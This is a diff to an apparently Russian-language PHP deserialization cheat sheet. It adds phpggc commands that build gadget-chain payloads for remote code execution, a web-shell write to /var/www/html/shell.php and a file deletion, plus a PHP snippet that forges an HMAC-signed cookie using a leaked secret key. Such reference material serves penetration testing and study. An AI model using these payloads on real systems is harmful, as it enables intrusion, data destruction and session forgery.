@@ -157,10 +157,18 @@ if($obj) {
 * Guzzle
 
 ```
-phpggc monolog/rce1 'phpinfo();' -s
-phpggc monolog/rce1 assert 'phpinfo()'
-phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
-phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
+./phpggc monolog/rce1 'phpinfo();' -s
+./phpggc monolog/rce1 assert 'phpinfo()'
+./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
+./phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
+./phpggc Symfony/RCE4 exec 'rm /file.txt' | base64
+```
+```
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
 ```
 
 # Десериализация Phar
